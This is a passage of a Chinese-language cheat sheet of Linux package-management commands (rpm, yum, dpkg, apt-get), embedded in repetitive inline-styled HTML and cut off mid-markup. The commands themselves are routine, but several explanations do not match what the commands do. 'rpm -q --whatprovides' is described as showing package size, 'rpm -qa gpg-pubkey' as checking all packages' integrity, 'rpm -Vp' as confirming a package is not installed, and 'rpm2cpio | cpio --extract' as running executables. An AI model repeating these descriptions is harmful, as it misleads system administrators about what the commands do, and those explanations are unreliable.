style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -q package_name --whatrequires 显示与一个rpm包存在依赖关系的列表</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -q package_name --whatprovides 显示一个rpm包所占的体积</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -q package_name --scripts 显示在安装/删除期间所执行的脚本l</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -q package_name --changelog 显示一个rpm包的修改历史</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -qf /etc/httpd/conf/httpd.conf 确认所给的文件由哪个rpm包所提供</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -qp package.rpm -l 显示由一个尚未安装的rpm包提供的文件列表</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm --import /media/cdrom/RPM-GPG-KEY 导入公钥数字证书</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm --checksig package.rpm 确认一个rpm包的完整性</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -qa gpg-pubkey 确认已安装的所有rpm包的完整性</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -V package_name 检查文件尺寸、 许可、类型、所有者、群组、MD5检查以及最后修改时间</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -Va 检查系统中所有已安装的rpm包- 小心使用</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -Vp package.rpm 确认一个rpm包还未安装</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm2cpio package.rpm | cpio --extract --make-directories *bin* 从一个rpm包运行可执行文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -ivh /usr/src/redhat/RPMS/`arch`/package.rpm 从一个rpm源码安装一个构建好的包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpmbuild --rebuild package_name.src.rpm 从一个rpm源码构建一个 rpm 包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><br></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>YUM 软件包升级器 - （Fedora, RedHat及类似系统）</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">yum install package_name 下载并安装一个rpm包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">yum localinstall package_name.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">yum update package_name.rpm 更新当前系统中所有安装的rpm包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">yum update package_name 更新一个rpm包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">yum remove package_name 删除一个rpm包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">yum list 列出当前系统中安装的所有包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">yum search package_name 在rpm仓库中搜寻软件包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">yum clean packages 清理rpm缓存删除下载的包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">yum clean headers 删除所有头文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">yum clean all 删除所有缓存的包和头文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><br></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>DEB 包 (Debian, Ubuntu 以及类似系统)</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dpkg -i package.deb 安装/更新一个 deb 包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dpkg -r package_name 从系统删除一个 deb 包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dpkg -l 显示系统中所有已经安装的 deb 包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dpkg -l | grep httpd 显示所有名称中包含 \"httpd\" 字样的deb包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dpkg -s package_name 获得已经安装在系统中一个特殊包的信息</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dpkg -L package_name 显示系统中已经安装的一个deb包所提供的文件列表</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dpkg --contents package.deb 显示尚未安装的一个包所提供的文件列表</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dpkg -S /bin/ping 确认所给的文件由哪个deb包提供</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><br></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>APT 软件工具 (Debian, Ubuntu 以及类似系统)</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">apt-get install package_name 安装/更新一个 deb 包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">apt-cdrom install package_name 从光盘安装/更新一个 deb 包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">apt-get update 升级列表中的软件包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">apt-get upgrade 升级所有已安装的软件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">apt-get remove package_name 从系统删除一个deb包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">apt-get check 确认依赖的软件仓库正确</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">apt-get clean 从下载的软件包中清理缓存</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 